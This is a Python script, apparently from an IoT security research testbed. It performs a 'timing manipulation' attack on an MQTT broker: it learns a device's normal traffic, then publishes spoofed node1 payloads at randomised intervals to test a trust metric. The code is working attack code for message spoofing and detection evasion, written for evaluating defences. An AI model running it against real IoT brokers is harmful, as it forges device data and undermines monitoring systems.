"""
=========================================================
ATTACK: TIMING MANIPULATION
=========================================================
Methodology Section 3.2.2 / Table 1:
  Alteration of message transmission intervals.
  Expected: T heavily reduced (High risk)

Payload content stays statistically normal (full node1 schema,
learned IP) — only the inter-arrival timing is distorted.
=========================================================
"""

import os
import time
import random
from adaptive_learner import learn_network, make_client
import payloads

# =========================
# CONFIG
# =========================
BROKER         = os.environ.get("MQTT_BROKER", "localhost")
PORT           = 1883
USER           = "esp32user"
PASSWORD       = os.environ.get("MQTT_PASS", "")
TARGET_TOPIC   = "iot/node1/data"
ATTACKER_ID    = "attacker_timing_py"
LEARN_DURATION = 60
MIN_FACTOR     = 0.1   # 10% of normal interval (burst)
MAX_FACTOR     = 5.0   # 500% of normal interval (long gap)


def run(profile, broker=BROKER, port=PORT, user=USER, password=PASSWORD,
        target_topic=TARGET_TOPIC, duration=None, stop_event=None,
        on_publish=None, captured=None):
    """Publish normal-looking payloads at randomised intervals.

    Returns the number of messages published.
    """
    client = make_client(ATTACKER_ID)
    client.username_pw_set(user, password)
    client.connect(broker, port, 60)
    client.loop_start()

    base = profile.interval_mean
    count = 0
    end = time.time() + duration if duration else None
    try:
        while True:
            if stop_event is not None and stop_event.is_set():
                break
            if end is not None and time.time() >= end:
                break
            payload = payloads.build_payload(profile)
            client.publish(target_topic, payload)
            count += 1
            if on_publish:
                on_publish(payload)

            factor = random.uniform(MIN_FACTOR, MAX_FACTOR)
            delay = base * factor
            if on_publish:
                print(f"[timing] delay={delay:.2f}s ({factor:.2f}x)")
            time.sleep(delay)
    except KeyboardInterrupt:
        pass
    finally:
        client.loop_stop()
        client.disconnect()
    return count


def main():
    print("=== TIMING MANIPULATION ATTACK (adaptive) ===")
    print(f"Target: {TARGET_TOPIC}")

    profile = learn_network(BROKER, PORT, USER, PASSWORD,
                             TARGET_TOPIC, learn_duration=LEARN_DURATION)

    print(f"\n=== ATTACK ACTIVE — base {profile.interval_mean:.2f}s "
          f"randomised {MIN_FACTOR}x-{MAX_FACTOR}x ===")
    print("Only T should degrade — F, D, P stay normal\n")
    run(profile, on_publish=lambda m: print(f"[timing] {m}"))


if __name__ == "__main__":
    main()
